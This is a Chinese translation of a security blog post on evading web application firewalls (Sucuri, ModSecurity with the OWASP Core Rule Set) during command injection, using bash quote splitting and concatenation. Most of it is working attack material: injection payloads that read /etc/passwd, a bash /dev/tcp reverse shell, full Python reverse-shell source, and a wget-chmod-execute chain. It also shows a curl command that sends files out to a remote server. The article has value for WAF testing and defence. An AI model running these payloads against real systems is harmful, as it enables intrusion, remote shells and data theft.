> 原文链接: https://www.anquanke.com//post/id/145542 


# web应用防火墙逃逸技术（二）


                                阅读量   
                                **109656**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://medium.com
                                <br>原文地址：[https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01bbb663e75812e1e6.jpg)](https://p5.ssl.qhimg.com/t01bbb663e75812e1e6.jpg)

### 传送门： [web应用防火墙逃逸技术（一）](https://www.anquanke.com/post/id/145518)

## 前言

在第一部分中，我们已经看到了如何使用通配符绕过WAF规则，更具体地说，使用问号通配符。<br>
显然，还有很多其他方法可以绕过WAF规则集，我认为每次攻击都有其特定的逃避技巧。<br>
例如：在SQL注入有效内容中使用注释语法可能会绕过许多过滤器。<br>
我的意思是使用`union+select`类似的东西：

```
/?id=1+un/**/ion+sel/**/ect+1,2,3--
```

这是一个很好的技术，当目标WAF处于低级别时，它可以很好地工作，并且允许星号*和连字符。<br>
这应该只适用于SQL注入，它不能用于利用本地文件包含或远程命令执行。<br>
如果你想联系一些waf bypass技术，最近我已经创建FluxCapacitor

```
https://www.hackthebox.eu/login
```

本文不包含解决FluxCapacitor特定场景的任何提示，但可以提高您对此技术的了解。



## 连接符

在许多编程语言中，字符串连接是一个二进制中缀运算符。<br>
+（加）操作经常重载表示为字符串参数级联：”Hello, “ + “World”具有值”Hello, World”<br>
在其他语言中，也有一些单独的运算符，例如：<br>
Perl和PHP的`.`<br>
Lua的`..`等等<br>
例如：

```
$ php -r 'echo "hello"." world"."n";'
hello world
$ python -c 'print "hello" + " world"'
hello world
```

但如果你以为这就是连接字符串的唯一途径，那你就错了~<br>
在几种语言中，特别是C，C ++，Python以及可以在Bash中找到的脚本语言/语法，都有一些名为string literal concatenation的含义，意思是相邻的字符串连接在一起，没有任何操作符：`"Hello, " "World"`具有值`"Hello, World"`。这不仅适用于printf和echo命令，而且适用于整个bash语法。让我们从头开始。<br>
以下每个命令都具有相同的结果：

```
# echo test
# echo 't'e's't
# echo 'te'st
# echo 'te'st''
# echo 'te'''st''
# python -c 'print "te" "st"'
```

[![](https://p0.ssl.qhimg.com/t01d0355875df350df8.png)](https://p0.ssl.qhimg.com/t01d0355875df350df8.png)<br>
发生这种情况是因为所有相邻的字符串在Bash中连接在一起。<br>
实际上`'te's't'`由三个字符串组成：字符串te，字符串s和字符串t。<br>
该语法可用于绕过基于“匹配短语” 的过滤器（或WAF规则）（例如，ModSecurity中的pm操作符）。<br>
ModSecurity中的规则`SecRule ARGS "[@pm](https://github.com/pm) passwd shadow groups".....`将阻止包含passwd或shadow的所有请求。但是如果我们将它们转换为`pa'ss'wd或sh'ad'ow`<br>
就像我们之前看到的SQLi语法一样，它使用注释来分割查询，在这里我们也可以使用单引号`'`分割文件名和系统命令并创建一组串联的字符串。<br>
同一个命令的几个例子：

```
$ /bin/cat /etc/passwd
$ /bin/cat /e'tc'/pa'ss'wd
$ /bin/c'at' /e'tc'/pa'ss'wd
$ /b'i'n/c'a't /e't'c/p'a's's'w'd'
```

[![](https://p4.ssl.qhimg.com/t01a825cb1db10a3b47.png)](https://p4.ssl.qhimg.com/t01a825cb1db10a3b47.png)<br>[![](https://p0.ssl.qhimg.com/t0159fc8f0b62d3679e.png)](https://p0.ssl.qhimg.com/t0159fc8f0b62d3679e.png)<br>
现在，让我们假设您已经发现了一个对应用程序执行远程命令的url参数。如果有一条规则阻止诸如`etc，passwd，shadow`等等这样的短语，你可以用类似这样的方法绕过它：

```
curl .../?url=;+cat+/e't'c/pa'ss'wd
```

是时候做一些测试了！<br>
我将使用下面的PHP代码，以测试它，像往常一样，我使用了Sucuri WAF和ModSecurity的。<br>
大概，阅读这段代码后，你会觉得它太愚蠢和简单了，没有人不去使用PHP curl函数，而在`system()`函数内部使用`curl`，我将使用的PHP代码是：

```
&lt;?php
   if ( isset($_GET['zzz']) ) `{`
      system('curl -v '.$_GET['zzz']);
   `}`
```



## Sucuri WAF

我认为在这两篇文章后不久，Sucuri的某个人将会很快删除我的帐户<br>
~但是，我发誓：我使用`Sucuri WAF`与我的`ModSecurity`进行比较，并不是因为我认为其中一个比另一个更好。<br>
Sucuri提供了很好的服务，我将它作为示例，仅仅因为它被广泛使用，所有用户阅读本文，都可以在其Web应用程序上更好地测试这些技术。<br>
首先，我尝试使用此PHP应用程序来获取google.com的响应主体，而不对参数的值进行编码：

```
curl -v 'http://test1.unicresit.it/?zzz=google.com'
```

它按预期工作，google.com 302页面显示，我应该跳转到www.google.de（谷歌地理定位我的服务器在Frankfurt）：<br>[![](https://p2.ssl.qhimg.com/t01e041ef4dd8a82522.png)](https://p2.ssl.qhimg.com/t01e041ef4dd8a82522.png)<br>
现在，为了利用这个易受攻击的应用程序，我做了很多事情。其中一件事是用分号`;`分解`curl`并尝试执行其他系统命令。<br>
当我尝试读取`/etc/passwd`文件时，Sucuri会探测到<br>
例如：

```
curl -v 'http://test1.unicresit.it/?zzz=;+cat+/etc/passwd'
```

由于以下原因被Sucuri WAF阻止

```
阻止试图对RFI / LFI进行的检测
```

我认为（只是一个假设，因为用户无法看到Sucuri WAF规则的细节）<br>`Sucuri RFI / LFI`尝试规则使用了我们以前见过的“匹配短语”之类的东西，并列出了常见的路径和文件名etc/passwd。这个WAF有一个非常简约的规则集和一个非常低的级别，可以让我用两个单引号绕过这条规则！

```
curl -v "http://test1.unicresit.it/?zzz=;+cat+/e'tc/pass'wd"
```

[![](https://p5.ssl.qhimg.com/t01a09b20946c842217.png)](https://p5.ssl.qhimg.com/t01a09b20946c842217.png)<br>
我知道你在想什么：是否在Sucuri WAF积极保护你的应用程序的时候获取一个shell？<br>
当然可以！<br>
但是唯一的问题是我们不能使用netcat，因为它没有安装在目标容器上

```
$ curl -s "http://test1.unicresit.it/?zzz=;+which+ls"
/bin/ls
$ curl -s "http://test1.unicresit.it/?zzz=;+which+nc"
$
```

最简单的方法（可以被WAF阻止的特殊字符很少）就是使用`bash -i`命令：`bash -i &gt;&amp; /dev/tcp/1.1.1.1/1337 0&gt;&amp;1`，但不幸的是，使用该payload绕过所有规则集太复杂了，这意味着很难使用某些PHP， Perl或Python代码来获取它。Sucuri WAF以此原因阻止了我的尝试

```
检测到混淆的攻击负载
```

完蛋了，不是吗？<br>
我可以尝试使用`curl wget`将python的反向shell上传到目标的可写目录中，而不是直接在易受攻击的参数上执行shell。首先，准备python代码：`vi shell.py`

```
#!/usr/bin/python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("&lt;my ip address&gt;",2375));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

然后公开一个可以从目标访问的web服务器，像往常一样使用`python -c SimpleHTTPServer`或`php -S`等<br>
然后从目标网站下载shell.py文件，我已经使用了以下语法：

```
curl -v '.../?zzz=&lt;myip&gt;:2375/shell.py+-o+/tmp/shell.py'
```

[![](https://p2.ssl.qhimg.com/t0194c2d0b23df26d2f.png)](https://p2.ssl.qhimg.com/t0194c2d0b23df26d2f.png)<br>[![](https://p5.ssl.qhimg.com/t01f5e7a6f20072cdbf.png)](https://p5.ssl.qhimg.com/t01f5e7a6f20072cdbf.png)<br>
好的，Sucuri WAF并没有阻止这个请求，但通常ModSecurity会阻止<br>
如果你想确保绕过所有的“匹配短语”规则类型，你可以使用<br>`wget + ip-to-long转换 + string串联`<br>
例如

```
.../?zzz=wg'e't 168431108 -P tmp
.../?zzz=c'hm'od 777 -R tmp
.../?zzz=/t'm'p/index.html
```

第一条命令wget用来下载`/tmp/shell`文件。<br>
第二个用于chmod使其可执行<br>
第三个执行它。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01108fab1e9ed9f137.gif)



## 绕过ModSecurity和OWASP核心规则集

可能你认为，如果waf检测级别很低，你可以绕过OWASP核心规则集，就像我们在第一篇文章中看到的那样。<br>
但这样基本行不通。因为有两个东西叫做`normalizePath`和`cmdLine`。<br>
在ModSecurity中，它们被称为“转换函数”，用于在输入数据用于匹配之前修改输入数据（例如，运算符执行）。<br>
ModSecurity将创建数据副本，对其进行转换，然后根据结果运行运算符。<br>
normalizePath：从输入字符串中删除多个斜杠，目录自引用和目录反引用（输入开始时除外）。<br>
cmdLine：将打破所有渗透者的梦想，该转换函数通过规范化参数值并触发所有规则，例如`/e't'c/pa'ss'wd`，被规范化为`/etc/passwd`，然后再进行规则触发。<br>
它做了很多事情！比如<br>
删除所有反斜杠``<br>
删除所有双引号`"`<br>
删除所有的单引号`'`<br>
删除所有插入符号`^`<br>
在斜杠`/`前删除空格<br>
在开括号`(`之前删除空格<br>
将所有逗号`,`和分号`;`替换为空格<br>
将所有多个空格（包括制表符，换行符等）替换为一个空格<br>
将所有字符转换为小写<br>
由于cmdLine转换函数的原因，规则932160阻止了所有尝试利用带有级联字符串的RCE的尝试：

```
Matched "Operator `PmFromFile' with parameter `unix-shell.data' against variable `ARGS:zzz' (Value: ` cat /e't'c/pa'ss'wd' )"
"o5,10v10,20t:urlDecodeUni,t:cmdLine,t:normalizePath,t:lowercase"
"ruleId":"932160"
```

我无法读取`/etc/passwd`，但不要绝望！<br>
OWASP核心规则集知道公用文件，路径和命令以阻止它们，但它不能与目标应用程序的源代码执行相同的操作。<br>
我不能使用分号`;`字符（这意味着我不能破坏curl语法），但是我可以使用curl来将文件泄露发送到我的远程服务器。这一招适用于paranoia level 0-3<br>
诀窍是用POST HTTP请求将文件发送到请求主体中的远程服务器，并且curl可以通过使用data参数来完成-d：

```
curl -d @/&lt;file&gt; &lt;remote server&gt;
```

请求后，编码`@`为`%40`：

```
curl ".../?zzz=-d+%40/usr/local/.../index.php+1.1.1.1:1337"
```

[![](https://p4.ssl.qhimg.com/t013df006bffe746fb8.png)](https://p4.ssl.qhimg.com/t013df006bffe746fb8.png)<br>
如果目标的paranoia level设置为4，所有这些都不起作用，因为payload包含连字符，正斜杠等字符<br>
好消息是paranoia level 4在生产环境中很难找到。



## 反斜杠是新的单引号:)

同样的技术也可以使用反斜杠``字符。这不是一个串联字符串，而只是一个转义序列：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a548a3f6bbbf78a2.png)<br>
目前为止就这样了。这么长时间，感谢各位！
